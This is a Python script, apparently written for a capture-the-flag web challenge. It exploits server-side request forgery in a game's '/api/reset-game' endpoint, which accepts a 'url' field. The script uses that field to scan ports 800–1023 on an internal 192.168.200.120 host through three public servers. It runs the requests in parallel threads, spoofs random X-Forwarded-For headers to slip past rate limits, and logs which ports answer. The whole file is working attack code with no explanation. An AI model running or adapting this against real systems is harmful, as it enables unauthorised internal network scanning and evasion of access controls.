import requests, json, os
from concurrent.futures import ThreadPoolExecutor
from time import sleep

class Data:
    def __init__(self, path, headers, data):
        self.path = path
        self.headers = headers
        self.data = data

def post(args: Data):
    args.headers['X-Forwarded-For'] = os.urandom(16).hex()
    return requests.post(
        args.path,
        headers=args.headers,
        data=args.data
    )

pathes = [
    'http://15.165.37.31:3000/api/reset-game',
    'http://3.38.141.72:3000/api/reset-game',
    'http://43.203.168.235:3000/api/reset-game',
]

headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Length': '49',
    'Content-Type': 'text/plain;charset=UTF-8',
    'Origin': 'http://15.165.37.31:3000',
    'Pragma': 'no-cache',
    'Referer': 'http://15.165.37.31:3000/hide-and-seek',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
}

result = {}
workers = 15
ports = list(range(800, 1024))

for port_start in range(0, len(ports), workers):
    reqs = []
    path_and_port = [(pathes[i % 3], port) for i, port in enumerate(ports[port_start:port_start+workers])]
    for path, port in path_and_port:
        reqs.append(
            Data(path=path, headers=headers, data='{"url":"http://192.168.200.120:' + str(port) + '"}')
        )

    with ThreadPoolExecutor(max_workers=workers) as pool:
        responses = pool.map(post, reqs)

    for res, (path, port) in zip(responses, path_and_port):
        try:
            data = res.json()
            msg = 'fail'
            if 'message' in data:
                msg = data['message']
                L = result.get(msg, list())
                L.append(port)
                result[msg] = L
            
            if 'error' in data:
                msg = data['error']
                L = result.get(msg, list())
                L.append(port)
                result[msg] = L

            print(port, '=>', msg)
        except:
            print(port, '(failed)', '=>', res.status_code, res.headers, res.text)
            continue

    sleep(2)

try:
    json.dump(result, ensure_ascii=False, fp=open('result.json', 'w'))
except:
    print(result)